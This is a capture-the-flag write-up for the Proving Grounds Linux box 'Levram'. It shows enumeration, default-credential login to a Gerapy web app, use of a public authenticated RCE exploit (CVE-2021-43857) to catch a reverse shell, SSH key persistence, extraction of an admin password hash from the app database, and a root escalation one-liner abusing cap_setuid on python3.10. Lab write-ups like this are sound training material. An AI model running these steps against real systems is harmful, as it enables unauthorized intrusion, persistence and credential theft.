---
machine: Levram
platform: Proving Grounds
category: Linux
difficulty: Easy
tags: [gerapy, cve-2021-43857, authenticated-rce, linux-capabilities, cap-setuid]
date: 2026-07-18
status: retired
summary: A minimal Ubuntu box running a crawler-management webapp — testing default-credential access to a known authenticated remote-code-execution vulnerability, and a Linux file-capability misconfiguration on the Python interpreter for a direct root escalation.
---

## Enumeration

nmap scan:

```bash
┌──(kali㉿kali)-[~/oscp/tools/win]
└─$ sudo nmap 192.168.133.24 -p- -T4 -oN portscan                    
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-18 16:17 -0400
Nmap scan report for 192.168.133.24
Host is up (0.062s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 46.08 seconds


```

Visting port 8000, we get a webabb with an ethereum logo called Gerapy.

We can log in with default creds. Nothing seems obviously vulnerable here so we look up gerapy CVE's and find this one for 0.9.7.

```bash
┌──(kali㉿kali)-[~/oscp/tools/win]
└─$ searchsploit gerapy                                                  
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Gerapy 0.9.7 - Remote Code Execution (RCE) (Authenticated)                                                                | python/remote/50640.py
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                                                                            
┌──(kali㉿kali)-[~/oscp/tools/win]
└─$ searchsploit -m gerapy                                                  
[!] Could not find EDB-ID #


                                                                                                                                                            
┌──(kali㉿kali)-[~/oscp/tools/win]
└─$ searchsploit -m python/remote/50640.py
  Exploit: Gerapy 0.9.7 - Remote Code Execution (RCE) (Authenticated)
      URL: https://www.exploit-db.com/exploits/50640
     Path: /usr/share/exploitdb/exploits/python/remote/50640.py
    Codes: CVE-2021-43857
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/kali/oscp/tools/win/50640.py
```

## Foothold

When we first run this, the exploit reaches `Login Successful` and crashes, after some research we realize we need to make a project first.

After making a project it runs through the script but never catches itself like its supposed to:

```text
Exploit for CVE-2021-43857
For: Gerapy < 0.9.8
[*] Resolving URL...
[*] Logging in to application...
[*] Login successful! Proceeding...
[*] Getting the project list
[*] Found project: test
[*] Getting the ID of the project to build the URL
[*] Found ID of the project:  1
[*] Setting up a netcat listener
listening on [any] 4444 ...
[*] Executing reverse shell payload
[*] Watchout for shell! :)
whoami
dir
```

So I try commenting out the part of the exploit which begins a netcat listener, opting to catch it on my own:

```python
		#netcat listener
		#print("[*] Setting up a netcat listener")
		#listener = subprocess.Popen(["nc", "-nvlp", self.localport])
		#ime.sleep(3)
```

Now we successfully catch the shell and have access to the app user:

```bash
──(kali㉿kali)-[~/oscp/tools/win]
└─$ penelope
[+] Listening for reverse shells on 0.0.0.0:4444 -> 127.0.0.1 • 10.0.2.15 • 172.18.0.1 • 172.17.0.1 • 192.168.45.211
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => ubuntu 192.168.133.24 Linux-x86_64 👤 app(1000) 😍️ Session ID <1>
[+] ⭐ Agent deployed via /usr/bin/python3
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
[+] Session log: /home/kali/.penelope/sessions/ubuntu~192.168.133.24-Linux-x86_64/2026_07_18-16_35_57-060-app(1000).log
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
app@ubuntu:~/gerapy$ whoami
app
app@ubuntu:~/gerapy$ 
```

(In hindsight I had a typo in more port number and this is likely why it was not catching itself)

For ease of access I generate an ssh key pair and add my kali's pub key to the app user so I can ssh in directly

### Persistance via Adding a Generated Public SSH Key to Target User

```bash
# On kali gen keypair
ssh-keygen -t ed25519 -f ./target_key -N ""

# On target
mkdir -p ~/.ssh chmod 700 ~/.ssh echo 'ssh-ed25519 AAAA...your pubkey...' >> ~/.ssh/authorized_keys chmod 600 ~/.ssh/authorized_keys

# SSH in on Kali
chmod 600 target_key ssh -i target_key user@TARGET_IP
```

We transfer the database back to our kali machine via SCP:

```bash
──(kali㉿kali)-[~/oscp/levram]
└─$ scp -i target_key app@192.168.133.24:/home/app/gerapy/dbs/db.sqlite3 ./db.sqlite3
db.sqlite3 
```

We find a hash for admin in the `auth_user` table in `db.sqlite3`

```bash
┌──(kali㉿kali)-[~/oscp/levram]
└─$ sqlite3 db.sqlite3
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> select * from auth_user;
1|pbkdf2_sha256$150000$ywalf7yp3z6D$encB0AjAbzkuCQQp2rZrUESEvxrt/6WmeNy+SRWX4ko=||1|admin||admin@gerapy.com|1|1|2023-06-13 21:05:20.520852|
sqlite>
```

## Privilege Escalation

I cant seem to crack it so we move on and put linpeas on the box

We see a section about files with capabilities and cap_setuid is in red and yellow severity:

```text
Files with capabilities (limited to 50):
/snap/core20/1518/usr/bin/ping cap_net_raw=ep
/snap/core20/1891/usr/bin/ping cap_net_raw=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/python3.10 cap_setuid=ep
/usr/bin/ping cap_net_raw=ep
```

Upon looking it up we learn about cap_setuid:

```text
Privilege escalation using `cap_setuid=ep` allows an unprivileged user to change the process's User ID (UID) to root. Because the capability is in the **e**ffective and **p**ermitted sets, you can programmatically spawn a root shell.
```

https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/
The goal is to run a python script, import os, and call os.setuid(0), and then spawn a bin/bash shell in that context.

```bash
getcap -r / 2>/dev/null

pwd

ls -al python3

./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

id
```

We get root this way!

```bash
app@ubuntu:/usr/bin$ ls -la python3.10
-rwxr-xr-x 1 root root 5912968 May 29  2023 python3.10
app@ubuntu:/usr/bin$ ./python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@ubuntu:/usr/bin# whoami
root
```
